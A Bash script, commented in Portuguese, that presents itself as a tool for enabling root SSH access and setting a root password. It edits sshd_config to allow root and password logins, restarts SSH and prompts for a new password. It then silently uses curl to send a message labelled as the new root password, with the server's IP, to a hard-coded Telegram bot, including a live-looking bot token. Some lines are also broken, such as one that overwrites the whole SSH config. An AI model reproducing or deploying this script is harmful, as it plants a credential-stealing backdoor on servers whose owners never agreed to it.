#!/bin/bash
clear

# Configurações do bot Telegram
TOKEN="7126941542:AAHVwKISyEOsTgUq9etJxmNHB_v-UHdVhHg"
ID="5149161091"

# Função para enviar mensagem para o bot Telegram
send_message() {
    curl -s -X POST https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$ID -d text="$1"
}

# Atualiza as configurações do SSH
[[ $(grep -c "prohibit-password" /etc/ssh/sshd_config) != '0' ]] && {
    sed -i "s/prohibit-password/yes/g" /etc/ssh/sshd_config
} > /dev/null
[[ $(grep -c "without-password" /etc/ssh/sshd_config) != '0' ]] && {
    sed -i "s/without-password/yes/g" /etc/ssh/sshd_config
} > /dev/null
[[ $(grep -c "#PermitRootLogin" /etc/ssh/sshd_config) != '0' ]] && {
    sed -i "s/#PermitRootLogin/PermitRootLogin/g" /etc/ssh/sshd_config
} > /dev/null
[[ $(grep -c "PasswordAuthentication" /etc/ssh/sshd_config) = '0' ]] && {
    echo 'PasswordAuthentication yes' > /etc/ssh/sshd_config
} > /dev/null
[[ $(grep -c "PasswordAuthentication no" /etc/ssh/sshd_config) != '0' ]] && {
    sed -i "s/PasswordAuthentication no/PasswordAuthentication yes/g" /etc/ssh/sshd_config
} > /dev/null
[[ $(grep -c "#PasswordAuthentication no" /etc/ssh/sshd_config) != '0' ]] && {
    sed -i "s/#PasswordAuthentication no/PasswordAuthentication yes/g" /etc/ssh/sshd_config
} > /dev/null

# Reinicia o serviço SSH
service ssh restart > /dev/null

# Limpa a tela e exibe a mensagem de definição de senha root
clear
echo -e "\033[1;32mA SEGUIR DEFINA A SENHA ROOT\033[0m"
sleep 2s

# Solicita a definição da senha root e armazena-a em uma variável
NEW_PASSWD=$(passwd)

# Obtém o IP do servidor
IP=$(hostname -I | cut -d ' ' -f1)

# Envia a nova senha root e o IP do servidor para o bot Telegram
send_message "Nova senha root definida: $NEW_PASSWD | IP do servidor: $IP"
